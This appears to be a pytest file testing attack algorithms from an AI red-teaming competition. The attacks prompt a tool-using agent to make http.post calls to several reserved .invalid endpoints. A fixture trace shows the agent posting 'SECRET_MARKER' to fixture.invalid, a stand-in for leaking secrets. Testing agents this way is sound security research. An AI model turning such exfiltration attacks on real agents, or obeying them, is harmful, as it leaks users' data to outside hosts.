"""Contract tests for the B017 replay-safe classify5 + slow-row six-endpoint frame."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B017_ATTACK_PATH = Path("baselines/replaysafe_slowmultipost6_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b017_only_widens_slow_multipost() -> None:
    b008 = _load_attack(B008R_ATTACK_PATH, "replaysafe_classify5_attack_for_b017_compare")
    b017 = _load_attack(B017_ATTACK_PATH, "replaysafe_slowmultipost6_attack")

    assert b008.SLOW_MULTIPOST_N == 4
    assert b017.SLOW_MULTIPOST_N == 6
    assert b017.SPLIT_CLASSIFY_N == b008.SPLIT_CLASSIFY_N == 5
    assert b017.SPLIT_THRESHOLD_S == b008.SPLIT_THRESHOLD_S == 12.0
    assert b017.REPLAY_SAFE_FRAC == b008.REPLAY_SAFE_FRAC == 0.99
    assert b017.REPLAY_BUDGET_MULT == b008.REPLAY_BUDGET_MULT == 1.0
    assert b017.PROBE_HOPS == b008.PROBE_HOPS == 0
    assert b017.BURST_K == b008.BURST_K == 1
    assert b017.TEMPLATE == b008.TEMPLATE
    assert b017.FRAME_TEMPLATE == b008.FRAME_TEMPLATE
    assert b017.PROMPT_TEMPLATES == b008.PROMPT_TEMPLATES


def test_b017_candidates_are_single_message(monkeypatch: pytest.MonkeyPatch) -> None:
    b017 = _load_attack(B017_ATTACK_PATH, "replaysafe_slowmultipost6_single_message")
    clock = FakeClock()
    monkeypatch.setattr(b017.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)

    candidates = b017.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    assert candidates
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)


def test_slow_row_switches_to_six_endpoint_frame_after_five_classification_posts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b017 = _load_attack(B017_ATTACK_PATH, "replaysafe_slowmultipost6_slow_row")
    clock = FakeClock()
    monkeypatch.setattr(b017.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)

    candidates = b017.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in candidates]
    plain_messages = [msg for msg in messages if "Call http.post once" in msg]
    forge_messages = [msg for msg in messages if "these 6 endpoints" in msg]

    assert len(plain_messages) == 5
    assert forge_messages
    assert all("these 4 endpoints" not in msg for msg in messages)
    assert all(".invalid" in msg for msg in forge_messages)
    assert all(msg.count("http://") == 6 for msg in forge_messages)
    assert set(env.hops) == {8}


def test_fast_row_keeps_b008r_plain_single_post_shape(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b017 = _load_attack(B017_ATTACK_PATH, "replaysafe_slowmultipost6_fast_row")
    clock = FakeClock()
    monkeypatch.setattr(b017.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)

    candidates = b017.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in candidates]
    assert messages
    assert all("these 6 endpoints" not in msg for msg in messages)
    assert all("these 4 endpoints" not in msg for msg in messages)
    assert all("Call http.post 2 times" not in msg for msg in messages)
    assert all(".invalid" in msg for msg in messages)
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)


def test_urls_stay_on_reserved_invalid_hosts() -> None:
    b017 = _load_attack(B017_ATTACK_PATH, "replaysafe_slowmultipost6_urls")
    for index in range(20):
        assert b017._url(index).endswith(".invalid")
        message = b017._forge_plan_message(index, b017.SLOW_MULTIPOST_N)
        assert "these 6 endpoints" in message
        assert message.count(".invalid") == 6
        assert ".co" not in message
        assert "example.com" not in message
